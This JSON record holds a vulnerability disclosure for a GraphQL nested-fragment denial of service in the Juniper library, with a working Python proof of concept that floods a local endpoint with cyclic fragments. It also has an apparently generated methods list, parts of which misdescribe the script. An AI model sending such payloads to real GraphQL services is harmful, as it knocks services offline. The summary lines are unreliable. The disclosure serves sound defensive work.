{"description": "### GraphQL behaviour\n\nNested fragment in GraphQL might be quite hard to handle depending on the implementation language.\nSome language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.\n\n```graphql\n# Infinite loop example\nquery {\n    ...a\n}\n\nfragment a on Query {\n    ...b\n}\n\nfragment b on Query {\n    ...a\n}\n```\n\n### POC TLDR\nWith max_size being the number of nested fragment generated.\nAt max_size=7500, it should instantly raise:\n\n![](https://i.imgur.com/wXbUx8l.png)\n\nHowever, with a lower size, you will overflow the memory after some iterations.\n\n### Reproduction steps (Juniper)\n\n```\ngit clone https://github.com/graphql-rust/juniper.git\ncd juniper\n```\n\nSave this POC as poc.py\n\n```python\nimport requests\nimport time\nimport json\nfrom itertools import permutations\n\nprint('=== Fragments POC ===')\n\nurl = 'http://localhost:8080/graphql'\n\nmax_size = 7500\nperms = [''.join(p) for p in permutations('abcefghijk')]\nperms = perms[:max_size]\n\nfragment_payloads = ''\nfor i, perm in enumerate(perms):\n    next_perm = perms[i+1] if i < max_size-1 else perms[0]\n    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'\n\npayload = {'query':'query{\\n  ...' + perms[0] + '\\n}' + fragment_payloads,'variables':{},'operationName':None}\n\nheaders = {\n  'Content-Type': 'application/json',\n}\n\ntry:\n    response = requests.request('POST', url, headers=headers, json=payload)\n    print(response.text)\nexcept requests.exceptions.ConnectionError:\n    print('Connection closed, POC worked.')\n```\n\n```\ncargo run\n[in separate shell] python3 poc.py\n```\n\n### Credits\n\n[@Escape-Technologies](https://escape.tech)\n\n@c3b5aw \n@MdotTIM \n@karimhreda \n", "methods": ["Used a GraphQL Nested Fragments overflow to cause a DOS condition.", "Used a POC to test the vulnerability, which involved sending a large number of nested fragment payloads to the GraphQL endpoint.", "Utilized a Python script to generate and send the payloads, which were designed to cause a memory overflow.", "Used the `requests` library to send the payloads to the GraphQL endpoint.", "Used a recursive approach to generate the nested fragment payloads.", "Used the `permutations` function to generate a large number of possible fragment permutations.", "Used a threshold of 7500 to determine when to stop generating permutations.", "Used a loop to send the payloads to the GraphQL endpoint and check for a connection error, which would indicate a successful DOS condition."]}